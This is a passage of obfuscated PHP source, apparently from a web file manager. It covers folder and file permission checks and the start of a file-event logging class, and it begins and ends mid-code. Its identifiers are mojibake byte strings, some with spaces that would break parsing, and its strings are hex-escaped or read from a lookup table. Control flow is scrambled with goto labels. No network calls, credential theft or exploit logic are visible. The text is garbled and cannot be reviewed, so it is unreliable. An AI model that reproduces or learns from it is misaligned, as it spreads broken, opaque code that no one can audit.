"\x69\157\x5f\x73\x6f\x75\x72\x63\145\137\x61\x75\x74\150"; public function getAuth($aç…ŸÜáù) { goto FçÈ‘°è„Ç; AÒ“ğå·ŠÃ: return $f×õ±‰‰çÀ; goto då†¼ÂçÎ; Eº½ª¼ÌÚ: $e¿«¯”İ = $this->field($dœ¿Ø¸ÇÃ)->order($D‚†ÕñÎù[364])->where($f½°£¹Š±Š)->select(); $f×õ±‰‰çÀ = array(); foreach ($e¿«¯”İ as $eªÓŠ˜†À) { if (Model($D‚†ÕñÎù[2151])->listData($eªÓŠ˜†À[$D‚†ÕñÎù[2135]])) { $f×õ±‰‰çÀ[] = $eªÓŠ˜†À; } } goto AÒ“ğå·ŠÃ; FçÈ‘°è„Ç: $D‚†ÕñÎù =& $_SERVER[÷ÖêïÔÔÓ]; $dœ¿Ø¸ÇÃ = $D‚†ÕñÎù[2150]; $f½°£¹Š±Š = array($D‚†ÕñÎù[366] => $aç…ŸÜáù); goto Eº½ª¼ÌÚ; då†¼ÂçÎ: } public function setAuth($aéÊÁ†­éÄ, $b¾àˆöò¯”) { goto dÙ³áñ±´ ; dÙ³áñ±´ : $D…ËÄ´ÂùØ =& $_SERVER[÷ÖêïÔÔÓ]; $c·ŠÒÃÚŒª = Model($D…ËÄ´ÂùØ[1077])->sourceInfo($aéÊÁ†­éÄ); if ($c·ŠÒÃÚŒª[$D…ËÄ´ÂùØ[368]] != SourceModel::TYPE_GROUP) { return !1; } goto bÃ¢ğ±ƒ–; BùÖäòÄ§•: $eŠÔÅ­Ä­ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $FŒ§‚·ç¾ = array(); foreach ($b¾àˆöò¯” as $e×„‰ÕÎ‡ˆ) { if (!in_array($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[368]], $eŠÔÅ­Ä­)) { show_json(LNG($D…ËÄ´ÂùØ[2152]), !1); } if ($E¥ŠËÌŒÙ != $Bö…†·‰Ç‘) { if ($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[368]] == SourceModel::TYPE_GROUP) { } if ($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[452]] != 0 && !in_array($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[452]], $cÏ’Ï–Ä‹)) { } } if ($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[452]] == 0) { $e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[368]] = SourceModel::TYPE_USER; } $FŒ§‚·ç¾[] = array($D…ËÄ´ÂùØ[366] => $aéÊÁ†­éÄ, $D…ËÄ´ÂùØ[368] => intval($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[368]]), $D…ËÄ´ÂùØ[452] => intval($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[452]]), $D…ËÄ´ÂùØ[2135] => intval($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[2135]]) ? intval($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[2135]]) : 0, $D…ËÄ´ÂùØ[2136] => intval($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[2136]]) ? intval($e×„‰ÕÎ‡ˆ[$D…ËÄ´ÂùØ[2136]]) : -1); } goto B Å¯âò‹; bÃ¢ğ±ƒ–: $Bö…†·‰Ç‘ = 1; $E¥ŠËÌŒÙ = $c·ŠÒÃÚŒª[$D…ËÄ´ÂùØ[452]]; if ($E¥ŠËÌŒÙ != $Bö…†·‰Ç‘) { $cƒ÷¤æñŒ = array($D…ËÄ´ÂùØ[2004] => $E¥ŠËÌŒÙ); $cÏ’Ï–Ä‹ = Model($D…ËÄ´ÂùØ[2081])->field($D…ËÄ´ÂùØ[1341])->where($cƒ÷¤æñŒ)->select(); $cÏ’Ï–Ä‹ = array_to_keyvalue($cÏ’Ï–Ä‹, $D…ËÄ´ÂùØ[33], $D…ËÄ´ÂùØ[1341]); } goto BùÖäòÄ§•; B Å¯âò‹: $this->where(array($D…ËÄ´ÂùØ[380] => $aéÊÁ†­éÄ))->delete(); $this->addAll($FŒ§‚·ç¾); return !0; goto Cğºô¥ÒŠĞ; Cğºô¥ÒŠĞ: } public function authClear($d¶ïíÚ˜éä) { $A ‚¼†åÍ¾ =& $_SERVER[÷ÖêïÔÔÓ]; $d×¿öó–Ù£ = Model($A ‚¼†åÍ¾[1077])->sourceInfo($d¶ïíÚ˜éä); $a¬Î†½­¹ = array($d¶ïíÚ˜éä); if ($d×¿öó–Ù£[$A ‚¼†åÍ¾[367]] == $A ‚¼†åÍ¾[493]) { $a¿ÈŸŠªŒ = array($A ‚¼†åÍ¾[518] => array($A ‚¼†åÍ¾[475], $d×¿öó–Ù£[$A ‚¼†åÍ¾[455]] . $d¶ïíÚ˜éä . $A ‚¼†åÍ¾[476])); $a¬Î†½­¹ = Model($A ‚¼†åÍ¾[1077])->field($A ‚¼†åÍ¾[380])->where($a¿ÈŸŠªŒ)->getField($A ‚¼†åÍ¾[366], !0); $a¬Î†½­¹[] = $d¶ïíÚ˜éä; } $this->where(array($A ‚¼†åÍ¾[380] => array($A ‚¼†åÍ¾[381], $a¬Î†½­¹)))->delete(); return !0; } public function get($eó¥˜ÎŠ©‹) { $fÈ‡¿çßåä = $this->getSourceList(array($eó¥˜ÎŠ©‹), !0); return $fÈ‡¿çßåä[0]; } public function getSourceList($aƒ¥âè¶“, $CÜ•Ï÷‰¶ƒ = false) { goto E”¯¨»¾Éã; BÎ±š£›°­: $bï†°¼ë­Ë = array_values(array_unique($bï†°¼ë­Ë)); if (!$bï†°¼ë­Ë) { return array(); } $DìÎ®ÙÂ„ë = $bÕ¹•·É§å[2154]; goto f”ßò³¢Ö¤; f”ßò³¢Ö¤: $fÛĞ©½ë¨ = array($bÕ¹•·É§å[380] => array($bÕ¹•·É§å[381], $bï†°¼ë­Ë)); $d‘à©»’Àï = $this->field($DìÎ®ÙÂ„ë)->where($fÛĞ©½ë¨)->select(); $d‘à©»’Àï = array_to_keyvalue_group($d‘à©»’Àï, $bÕ¹•·É§å[366]); goto C·»ĞÃ¦²; C·»ĞÃ¦²: $dŸŒÙ§ô“Ç = array(); foreach ($CÜ•Ï÷‰¶ƒ as $F×¨‰ŸŒ‡’ => $c‚„’öĞç…) { $dŸŒÙ§ô“Ç[$F×¨‰ŸŒ‡’] = $this->makeSourceAuth($c‚„’öĞç…, $d‘à©»’Àï); } return $dŸŒÙ§ô“Ç; goto c×Š¡ÌÍ ğ; DëõİÒĞ­ï: if (!$CÜ•Ï÷‰¶ƒ) { $fÛĞ©½ë¨ = array($bÕ¹•·É§å[380] => array($bÕ¹•·É§å[381], $aƒ¥âè¶“)); $CÜ•Ï÷‰¶ƒ = $Aøóø‚->field($bÕ¹•·É§å[2153])->where($fÛĞ©½ë¨)->select(); $CÜ•Ï÷‰¶ƒ = array_to_keyvalue($CÜ•Ï÷‰¶ƒ, $bÕ¹•·É§å[366]); } $bï†°¼ë­Ë = $aƒ¥âè¶“; foreach ($CÜ•Ï÷‰¶ƒ as $FÜ¦ŠÀŒØ => $FÑÂ¤Ò¡‹Ó) { $cÄ‡ê Ş† = $Aøóø‚->parentLevelArray($FÑÂ¤Ò¡‹Ó[$bÕ¹•·É§å[455]]); $bï†°¼ë­Ë = array_merge($bï†°¼ë­Ë, $cÄ‡ê Ş†, array($FÜ¦ŠÀŒØ)); } goto BÎ±š£›°­; E”¯¨»¾Éã: $bÕ¹•·É§å =& $_SERVER[÷ÖêïÔÔÓ]; if (!$aƒ¥âè¶“) { return array(); } $Aøóø‚ = Model($bÕ¹•·É§å[1077]); goto DëõİÒĞ­ï; c×Š¡ÌÍ ğ: } public function authDeepCheck($Aœˆƒ—é, $Dó•ğ¥µ•š = false) { $CåÃËŒ“‚­ =& $_SERVER[÷ÖêïÔÔÓ]; if ($GLOBALS[$CåÃËŒ“‚­[453]]) { return !1; } $A¿È†‡Ã„ = $this->makeAuthDeep(); if (!in_array($Aœˆƒ—é, $A¿È†‡Ã„)) { return !1; } return array($CåÃËŒ“‚­[374] => -1, $CåÃËŒ“‚­[414] => array($CåÃËŒ“‚­[382] => $CåÃËŒ“‚­[1005], $CåÃËŒ“‚­[2010] => $CåÃËŒ“‚­[464], $CåÃËŒ“‚­[383] => LNG($CåÃËŒ“‚­[2155]), $CåÃËŒ“‚­[2022] => $CåÃËŒ“‚­[2156])); } protected function makeAuthDeep() { goto b²ìÆ„© Ò; aÁŠÏëµ±½: return $A§óº—îî; goto bˆšÕÕê¨; eÔîˆ†îª: $bµà•ˆ÷¬â = array_values(array_unique($bµà•ˆ÷¬â)); foreach ($bµà•ˆ÷¬â as $a¼²¿¶ôµ) { $BÀª²Ø›ø— = $C‹‰”¾”àŒ->getInfo($a¼²¿¶ôµ); $A§óº—îî[] = $BÀª²Ø›ø—[$b·Ó”‘‰İÔ[388]][$b·Ó”‘‰İÔ[366]]; } $A§óº—îî = array_values(array_unique($A§óº—îî)); goto aÁŠÏëµ±½; b²ìÆ„© Ò: $b·Ó”‘‰İÔ =& $_SERVER[÷ÖêïÔÔÓ]; static $A§óº—îî = false; if ($A§óº—îî) { return $A§óº—îî; } goto c›‰†ğÀÄÀ; f‰†ù©ñÃÁ: if ($EŞ¿ßæ‚¡‚) { $dù‚áí¥ê¸ = array(array($b·Ó”‘‰İÔ[368] => SourceModel::TYPE_USER, $b·Ó”‘‰İÔ[452] => USER_ID), array($b·Ó”‘‰İÔ[368] => SourceModel::TYPE_GROUP, $b·Ó”‘‰İÔ[452] => array($b·Ó”‘‰İÔ[381], $EŞ¿ßæ‚¡‚)), $b·Ó”‘‰İÔ[910] => $b·Ó”‘‰İÔ[2087]); } if ($fÁÑÅä™„) { $dù‚áí¥ê¸ = array($dù‚áí¥ê¸, $b·Ó”‘‰İÔ[2135] => array($b·Ó”‘‰İÔ[2158], $fÁÑÅä™„)); } $F­ƒ¹Ø’ø— = $this->field($b·Ó”‘‰İÔ[2159])->where($dù‚áí¥ê¸)->select(); goto aâ–³ğòÀ‹; aâ–³ğòÀ‹: $fÏ±Ÿ½‹¹“ = array_to_keyvalue($F­ƒ¹Ø’ø—, $b·Ó”‘‰İÔ[33], $b·Ó”‘‰İÔ[366]); $A§óº—îî = array(); $bµà•ˆ÷¬â = $EŞ¿ßæ‚¡‚; goto f™ª Ã’˜«; FñéÄ‡Áó¬: $bµà•ˆ÷¬â = array_values(array_unique($bµà•ˆ÷¬â)); $C†åˆÙà»ˆ = $bµà•ˆ÷¬â; foreach ($C†åˆÙà»ˆ as $a¼²¿¶ôµ) { $BÀª²Ø›ø— = $C‹‰”¾”àŒ->getInfo($a¼²¿¶ôµ); $c©Œ¹àÄŠ© = $CÀ½°ç¤ä§->parentLevelArray($BÀª²Ø›ø—[$b·Ó”‘‰İÔ[455]]); $bµà•ˆ÷¬â = array_merge($bµà•ˆ÷¬â, $c©Œ¹àÄŠ©); } goto eÔîˆ†îª; c›‰†ğÀÄÀ: $c£’ŠË„´¯ = Model($b·Ó”‘‰İÔ[2157])->listData(); $fÁÑÅä™„ = array(); foreach ($c£’ŠË„´¯ as $eë¥Èà¢Ïö) { if ($eë¥Èà¢Ïö[$b·Ó”‘‰İÔ[373]] == 0 && $eë¥Èà¢Ïö[$b·Ó”‘‰İÔ[2024]] == $b·Ó”‘‰İÔ[493]) { $fÁÑÅä™„[] = $eë¥Èà¢Ïö[$b·Ó”‘‰İÔ[364]]; } } goto BÑ¿£ÍŒ·; BÑ¿£ÍŒ·: $EŞ¿ßæ‚¡‚ = Session::get($b·Ó”‘‰İÔ[2119]); $EŞ¿ßæ‚¡‚ = array_to_keyvalue($EŞ¿ßæ‚¡‚, $b·Ó”‘‰İÔ[33], $b·Ó”‘‰İÔ[2004]); $dù‚áí¥ê¸ = array($b·Ó”‘‰İÔ[368] => SourceModel::TYPE_USER, $b·Ó”‘‰İÔ[452] => USER_ID); goto f‰†ù©ñÃÁ; f™ª Ã’˜«: $CÀ½°ç¤ä§ = Model($b·Ó”‘‰İÔ[1077]); $C‹‰”¾”àŒ = Model($b·Ó”‘‰İÔ[454]); if ($fÏ±Ÿ½‹¹“) { $b¼œÛÌ—¶Ş = $CÀ½°ç¤ä§->where(array($b·Ó”‘‰İÔ[366] => array($b·Ó”‘‰İÔ[381], $fÏ±Ÿ½‹¹“)))->select(); foreach ($b¼œÛÌ—¶Ş as $Aæ†šÊ†Ìù) { $c©Œ¹àÄŠ© = $CÀ½°ç¤ä§->parentLevelArray($Aæ†šÊ†Ìù[$b·Ó”‘‰İÔ[455]]); $A§óº—îî = array_merge($A§óº—îî, $c©Œ¹àÄŠ©); $bµà•ˆ÷¬â[] = $Aæ†šÊ†Ìù[$b·Ó”‘‰İÔ[452]]; } } goto FñéÄ‡Áó¬; bˆšÕÕê¨: } private function makeSourceAuth($Dó©éÏóë, $EŒˆµ“³™) { goto DÊŒ¥Œ£°¨; dßÉè±á: $eáÏÏğ±›ˆ = array_merge(array($Dó©éÏóë[$D ß÷³±‚ˆ[366]]), array_reverse($eáÏÏğ±›ˆ)); $bØÉù±ºÄœ = !1; foreach ($eáÏÏğ±›ˆ as $EËŞ²…Ôˆé) { if (!isset($EŒˆµ“³™[$EËŞ²…Ôˆé])) { continue; } $b¯Ú«—ç¤ = $this->authMake($EŒˆµ“³™[$EËŞ²…Ôˆé]); if ($b¯Ú«—ç¤[$D ß÷³±‚ˆ[414]]) { $bØÉù±ºÄœ = $b¯Ú«—ç¤; break; } } goto Cä¿Ç‡¼ª³; Cä¿Ç‡¼ª³: if (!$bØÉù±ºÄœ) { $dÇÂããÄÅÆ = array_to_keyvalue($dÇÂããÄÅÆ, $D ß÷³±‚ˆ[2004]); $e×í·ĞŸğæ = $Dó©éÏóë[$D ß÷³±‚ˆ[452]]; $aÑ½ÒÑ°Üˆ = isset($dÇÂããÄÅÆ[$e×í·ĞŸğæ]) ? $dÇÂããÄÅÆ[$e×í·ĞŸğæ] : !1; if ($aÑ½ÒÑ°Üˆ) { $bØÉù±ºÄœ = array($D ß÷³±‚ˆ[2160] => intval($aÑ½ÒÑ°Üˆ[$D ß÷³±‚ˆ[373]][$D ß÷³±‚ˆ[373]]), $D ß÷³±‚ˆ[2161] => $aÑ½ÒÑ°Üˆ[$D ß÷³±‚ˆ[373]]); } } if ((!$bØÉù±ºÄœ || $bØÉù±ºÄœ[$D ß÷³±‚ˆ[374]] <= 0) && $Dó©éÏóë[$D ß÷³±‚ˆ[368]] == SourceModel::TYPE_GROUP) { $bØÉù±ºÄœ = $this->authDeepCheck($Dó©éÏóë[$D ß÷³±‚ˆ[366]], $bØÉù±ºÄœ); } return $bØÉù±ºÄœ; goto Eõ¦°ÄùÕ§; DÊŒ¥Œ£°¨: $D ß÷³±‚ˆ =& $_SERVER[÷ÖêïÔÔÓ]; $dÇÂããÄÅÆ = Session::get($D ß÷³±‚ˆ[2119]); $eáÏÏğ±›ˆ = Model($D ß÷³±‚ˆ[1077])->parentLevelArray($Dó©éÏóë[$D ß÷³±‚ˆ[455]]); goto dßÉè±á; Eõ¦°ÄùÕ§: } public function authOwnerApply($CÎåŸøÇé) { goto A³À´ÄâÈã; Bµ£¸ééìË: $fµ“­¡ÃÊÜ = Model($AÈòÌ¡…°¡[1077])->parentLevelArray($CÎåŸøÇé[$AÈòÌ¡…°¡[455]]); $fµ“­¡ÃÊÜ = array_merge(array($CÎåŸøÇé[$AÈòÌ¡…°¡[366]]), array_reverse($fµ“­¡ÃÊÜ)); $e ¬Şˆ¤‡¸ = $AÈòÌ¡…°¡[2154]; goto EåáÄ•È; dÍÔšÊÛİø: if (count($DâãÏ¶„éğ) == 0) { $DâãÏ¶„éğ = $this->authFolderOwnerGroup($CÎåŸøÇé[$AÈòÌ¡…°¡[452]]); } $DâãÏ¶„éğ = array_unique($DâãÏ¶„éğ); if (AuthModel::authCheckRoot($CÎåŸøÇé[$AÈòÌ¡…°¡[373]][$AÈòÌ¡…°¡[374]])) { $DâãÏ¶„éğ[] = USER_ID; } goto A¦ùíÑ ‘é; EåáÄ•È: $cñ¢ÑË¿òÏ = array($AÈòÌ¡…°¡[380] => array($AÈòÌ¡…°¡[381], $fµ“­¡ÃÊÜ)); $CÒ„†´‹Ó = $this->field($e ¬Şˆ¤‡¸)->where($cñ¢ÑË¿òÏ)->select(); $CÒ„†´‹Ó = array_to_keyvalue_group($CÒ„†´‹Ó, $AÈòÌ¡…°¡[366]); goto C¹¹Óä‰¶Ù; A³À´ÄâÈã: $AÈòÌ¡…°¡ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$CÎåŸøÇé[$AÈòÌ¡…°¡[373]] || $CÎåŸøÇé[$AÈòÌ¡…°¡[2162]]) { return $CÎåŸøÇé; } if (AuthModel::authCheckRoot($CÎåŸøÇé[$AÈòÌ¡…°¡[373]][$AÈòÌ¡…°¡[374]])) { return $CÎåŸøÇé; } goto Bµ£¸ééìË; A¦ùíÑ ‘é: $CÎåŸøÇé[$AÈòÌ¡…°¡[373]][$AÈòÌ¡…°¡[2164]] = Model($AÈòÌ¡…°¡[466])->userListInfo($DâãÏ¶„éğ); return $CÎåŸøÇé; goto dñö’ŞÔ¸«; C¹¹Óä‰¶Ù: $CÈ¿…º—ÆÉ = array(); $DâãÏ¶„éğ = array(); foreach ($CÒ„†´‹Ó as $A÷’ñø‚§İ => $e†¼Áºø) { $fãñ‚±ÅÒ = $this->authFolderOwnerUser($e†¼Áºø); $CÈ¿…º—ÆÉ[$A÷’ñø‚§İ] = $fãñ‚±ÅÒ; $DâãÏ¶„éğ = array_merge($DâãÏ¶„éğ, $fãñ‚±ÅÒ[$AÈòÌ¡…°¡[527]]); if ($fãñ‚±ÅÒ[$AÈòÌ¡…°¡[2163]]) { break; } } goto dÍÔšÊÛİø; dñö’ŞÔ¸«: } private function authFolderOwnerGroup($bØáäŠá§Š) { $DÃ¤Òã•‰ø =& $_SERVER[÷ÖêïÔÔÓ]; $f…ê¡¬óç = Model($DÃ¤Òã•‰ø[2081])->where(array($DÃ¤Òã•‰ø[2004] => $bØáäŠá§Š))->select(); $E‰½·±¾ä§ = array(); if (!$f…ê¡¬óç) { return $E‰½·±¾ä§; } foreach ($f…ê¡¬óç as $EÌïâ‚Ÿé›) { $a¯º äƒ¨ = $this->authInfo($EÌïâ‚Ÿé›); if (AuthModel::authCheckRoot($a¯º äƒ¨[$DÃ¤Òã•‰ø[373]])) { $E‰½·±¾ä§[] = $EÌïâ‚Ÿé›[$DÃ¤Òã•‰ø[1341]]; } } return $E‰½·±¾ä§; } private function authFolderOwnerUser($Eê¾Å±òÈ) { $FÆ‚¥›¾Íø =& $_SERVER[÷ÖêïÔÔÓ]; $aÂ³é‚Ã»ƒ = array(); $a÷•ŞºÜ¼ = !1; foreach ($Eê¾Å±òÈ as $Dâ¾Ù§ø¢±) { $AÍÖ„•’ªí = $this->authInfo($Dâ¾Ù§ø¢±); if ($Dâ¾Ù§ø¢±[$FÆ‚¥›¾Íø[452]] == $FÆ‚¥›¾Íø[464]) { $a÷•ŞºÜ¼ = !0; } if ($Dâ¾Ù§ø¢±[$FÆ‚¥›¾Íø[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($AÍÖ„•’ªí[$FÆ‚¥›¾Íø[373]])) { $aÂ³é‚Ã»ƒ[] = $Dâ¾Ù§ø¢±[$FÆ‚¥›¾Íø[452]]; } } } return array($FÆ‚¥›¾Íø[527] => $aÂ³é‚Ã»ƒ, $FÆ‚¥›¾Íø[2163] => $a÷•ŞºÜ¼); } public function authMake($FË‘îİì“î) { goto b‚ËÆßÆÂĞ; b…ºî†¡: $e©‰°Ø†½ = 0; $BÑÄìÙ‡•® = 0; $CÓ»‹¤÷™× = 0; goto aˆîä¥ø‚ô; DÜ´­¥·»Œ: $F¸ˆîªÖ‰ = array_to_keyvalue($aåèè—²é, $F‡ÍóÍñƒ¢[33], $F‡ÍóÍñƒ¢[2004]); $b¤‚‚Ã¯„ò = 0; $FÛµ­µ©îº = 0; goto Ašç¹Ñ„ùÊ; b‚ËÆßÆÂĞ: $F‡ÍóÍñƒ¢ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$FË‘îİì“î) { return array($F‡ÍóÍñƒ¢[374] => 0, $F‡ÍóÍñƒ¢[414] => !1); } $aåèè—²é = Session::get($F‡ÍóÍñƒ¢[2119]); goto DÜ´­¥·»Œ; Ašç¹Ñ„ùÊ: $BŞ„ÅßÁ¿ = 0; $C„™¢å½†ˆ = 0; $B›ñß¤ËêÎ = 0; goto b…ºî†¡; aˆîä¥ø‚ô: $e¨Ô¨®Ùì = 0; foreach ($FË‘îİì“î as $C–öÜ¹ëÁª) { $FÕì¥Œ²õÊ = $this->authInfo($C–öÜ¹ëÁª); $f‰äÎ÷ÇÎò = $C–öÜ¹ëÁª[$F‡ÍóÍñƒ¢[452]]; $F†Üø§ø— = intval($FÕì¥Œ²õÊ[$F‡ÍóÍñƒ¢[373]]); if ($C–öÜ¹ëÁª[$F‡ÍóÍñƒ¢[368]] == SourceModel::TYPE_USER && $f‰äÎ÷ÇÎò == USER_ID) { $BÑÄìÙ‡•® = !0; $C„™¢å½†ˆ = $FÕì¥Œ²õÊ; $b¤‚‚Ã¯„ò = $F†Üø§ø—; } else { if ($C–öÜ¹ëÁª[$F‡ÍóÍñƒ¢[368]] == SourceModel::TYPE_GROUP && in_array($f‰äÎ÷ÇÎò, $F¸ˆîªÖ‰)) { $CÓ»‹¤÷™× = !0; if ($F†Üø§ø— >= $FÛµ­µ©îº) { $FÛµ­µ©îº = $F†Üø§ø—; $B›ñß¤ËêÎ = $FÕì¥Œ²õÊ; } } else { if ($f‰äÎ÷ÇÎò == 0) { $e¨Ô¨®Ùì = !0; $e©‰°Ø†½ = $FÕì¥Œ²õÊ; $BŞ„ÅßÁ¿ = $F†Üø§ø—; } } } } $DÊ­ñìæ™Ë = $BÑÄìÙ‡•® ? $b¤‚‚Ã¯„ò : ($CÓ»‹¤÷™× ? $FÛµ­µ©îº : $BŞ„ÅßÁ¿); goto B†®’Š­¤è; B†®’Š­¤è: $FÕì¥Œ²õÊ = $BÑÄìÙ‡•® ? $C„™¢å½†ˆ : ($CÓ»‹¤÷™× ? $B›ñß¤ËêÎ : $e©‰°Ø†½); $dçƒß¥£åÙ = array($F‡ÍóÍñƒ¢[2160] => intval($DÊ­ñìæ™Ë), $F‡ÍóÍñƒ¢[2161] => $FÕì¥Œ²õÊ); return $dçƒß¥£åÙ; goto Féòœí«÷; Féòœí«÷: } public function authTargetInfoMake($F¼Á¯¨‚Ú®) { goto cî˜ëÎœ±®; D‹—¡Ï£¼Õ: return array($bÄĞ©¶Çï·[2165] => $CòÂËåäòø, $bÄĞ©¶Çï·[2166] => $cË’Èí»¶); goto F”×¸­íæ”; FÒ«§ˆÄ•Ù: foreach ($F¼Á¯¨‚Ú® as $D§¤‡¶˜©Ë) { if ($D§¤‡¶˜©Ë[$bÄĞ©¶Çï·[368]] == SourceModel::TYPE_USER) { $CòÂËåäòø[] = intval($D§¤‡¶˜©Ë[$bÄĞ©¶Çï·[452]]); } else { if ($D§¤‡¶˜©Ë[$bÄĞ©¶Çï·[368]] == SourceModel::TYPE_GROUP) { $cË’Èí»¶[] = intval($D§¤‡¶˜©Ë[$bÄĞ©¶Çï·[452]]); } } } if ($CòÂËåäòø) { $CòÂËåäòø = Model($bÄĞ©¶Çï·[466])->userListInfo($CòÂËåäòø); } if ($cË’Èí»¶) { $C¯ñäÃ‚íŞ = array($bÄĞ©¶Çï·[2079] => array($bÄĞ©¶Çï·[381], $cË’Èí»¶)); $cË’Èí»¶ = Model($bÄĞ©¶Çï·[454])->field($bÄĞ©¶Çï·[2092])->where($C¯ñäÃ‚íŞ)->select(); $cË’Èí»¶ = array_to_keyvalue($cË’Èí»¶, $bÄĞ©¶Çï·[2004]); } goto D‹—¡Ï£¼Õ; cî˜ëÎœ±®: $bÄĞ©¶Çï· =& $_SERVER[÷ÖêïÔÔÓ]; $CòÂËåäòø = array(); $cË’Èí»¶ = array(); goto FÒ«§ˆÄ•Ù; F”×¸­íæ”: } private function authInfo($FùÚÓÍÓÚğ) { $Cèš×‚éï =& $_SERVER[÷ÖêïÔÔÓ]; if ($FùÚÓÍÓÚğ[$Cèš×‚éï[2135]]) { $E–¢å±¡ç¸ = Model($Cèš×‚éï[2151])->listData($FùÚÓÍÓÚğ[$Cèš×‚éï[2135]]); if (!$E–¢å±¡ç¸) { return !1; $E…¢‡á©†µ = Model($Cèš×‚éï[2151])->listData(); $CÍ¥»¡Ë§ = array_filter_by_field($E…¢‡á©†µ, $Cèš×‚éï[373], $Cèš×‚éï[464]); return $CÍ¥»¡Ë§; } $C»—×°¢Ş¨ = array_field_key($E–¢å±¡ç¸, array($Cèš×‚éï[364], $Cèš×‚éï[28], $Cèš×‚éï[373], $Cèš×‚éï[2022], $Cèš×‚éï[2025])); $C»—×°¢Ş¨[$Cèš×‚éï[2167]] = $FùÚÓÍÓÚğ; return $C»—×°¢Ş¨; } else { return array($Cèš×‚éï[382] => 0, $Cèš×‚éï[2010] => $FùÚÓÍÓÚğ[$Cèš×‚éï[2136]], $Cèš×‚éï[383] => $Cèš×‚éï[33], $Cèš×‚éï[2022] => $Cèš×‚éï[2168]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\143\x65\x5f\x65\x76\145\156\164"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\x54\151\155\x65", "\x74\151\155\145", "\151\x6e\163\145\162\x74", "\x66\165\156\x63\164\151\157\x6e"), array("\x64\145\163\143", '', "\151\156\x73\145\x72\x74\x2c\x75\x70\x64\141\x74\145\54\x73\x65\x6c\145\x63\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($dÌ…éÄÛ‘¢, $FÌ³éÔš¼ˆ, $FÏ¥ÖÖ·¾ = '') { goto aªÓà°éŸš; aªÓà°éŸš: $FÊÜ“à™Ú =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->eventSave) { return; } $FÑ·ŒÅ¢‹À = Model($FÊÜ“à™Ú[1077])->sourceInfo($dÌ…éÄÛ‘¢); goto a–œ´‘ˆùã; a–œ´‘ˆùã: if (!$FÑ·ŒÅ¢‹À) { return !1; } if ($this->isCacheEvent($FÑ·ŒÅ¢‹À, $FÌ³éÔš¼ˆ)) { return; } if ($FÏ¥ÖÖ·¾ && is_string($FÏ¥ÖÖ·¾)) { $FÏ¥ÖÖ·¾ = array($FÊÜ“à™Ú[2035] => $FÏ¥ÖÖ·¾); } goto Eø¯¢Øô»; Eø¯¢Øô»: $DÍ«ß‰í³İ = array($FÊÜ“à™Ú[380] => $dÌ…éÄÛ‘¢, $FÊÜ“à™Ú[2169] => $FÑ·ŒÅ¢‹À[$FÊÜ“à™Ú[457]], $FÊÜ“à™Ú[2170] => $FÑ·ŒÅ¢‹À[$FÊÜ“à™Ú[28]], $FÊÜ“à™Ú[462] => $FÑ·ŒÅ¢‹À[$FÊÜ“à™Ú[462]], $FÊÜ“à™Ú[1332] => USER_ID, $FÊÜ“à™Ú[385] => $FÌ³éÔš¼ˆ, $FÊÜ“à™Ú[1334] => $FÏ¥ÖÖ·¾); $this->addSystemLog($FÌ³éÔš¼ˆ, $DÍ«ß‰í³İ); return $this->add($DÍ«ß‰í³İ); goto e¬Ûêò½µ“; e¬Ûêò½µ“: } private function addSystemLog($dº¬–Ô¥í, $E”«˜š¶‘Ä) { $aç×ê’´’´ =& $_SERVER[÷ÖêïÔÔÓ]; if ($dº¬–Ô¥í == $aç×ê’´’´[2171]) { $dº¬–Ô¥í = $E”«˜š¶‘Ä[$aç×ê’´’´[401]][$aç×ê’´’´[2172]]; } else { if (in_array($dº¬–Ô¥í, array($aç×ê’´’´[1981], $aç×ê’´’´[2173]))) { $dº¬–Ô¥í = $E”«˜š¶‘Ä[$aç×ê’´’´[401]][$aç×ê’´’´[678]]; } } $Dõ±îà­ß = array_merge($E”«˜š¶‘Ä, array($aç×ê’´’´[2174] => $E”«˜š¶‘Ä[$aç×ê’´’´[366]], $aç×ê’´’´[2175] => $E”«˜š¶‘Ä[$aç×ê’´’´[2175]])); Model($aç×ê’´’´[1946])->addLog($aç×ê’´’´[2176] . $dº¬–Ô¥í, $Dõ±îà­ß); } private function isCacheEvent($e‘®¡„±ÆÍ, $F‚ÏåÈá“) { if ($e‘®¡„±ÆÍ[$_SERVER[÷ÖêïÔÔÓ][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aÎ…‘²Şİ, $c›è†Ê·­») { $bÓçğ İÅ =& $_SERVER[÷ÖêïÔÔÓ]; $c¢š¹­½µ° = Model($bÓçğ İÅ[1077])->sourceInfo($aÎ…‘²Şİ); $aì¨®à¹ğ° = array($bÓçğ İÅ[2172] => $c›è†Ê·­», $bÓçğ İÅ[28] => $c¢š¹­½µ°[$bÓçğ İÅ[28]]); return $this->addEvent($aÎ…‘²Şİ, $bÓçğ İÅ[2171], $aì¨®à¹ğ°); } public function eventFileEdit($cªÉñß™Ç) { $Bèñ»¬ª©ù =& $_SERVER[÷ÖêïÔÔÓ]; $bƒ‘óøÌ¼Ë = array($Bèñ»¬ª©ù[2177] => $_SERVER[$Bèñ»¬ª©ù[2178]], $Bèñ»¬ª©ù[1649] => strtolower(ACTION)); return $this->addEvent($cªÉñß™Ç, $Bèñ»¬ª©ù[1973], $bƒ‘óøÌ¼Ë); } public function eventRecycle($bë³³¤îº¸, $CÓ‰àöÙÕŸ) { return $this->addEvent($bë³³¤îº¸, $_SERVER[÷ÖêïÔÔÓ][2173], 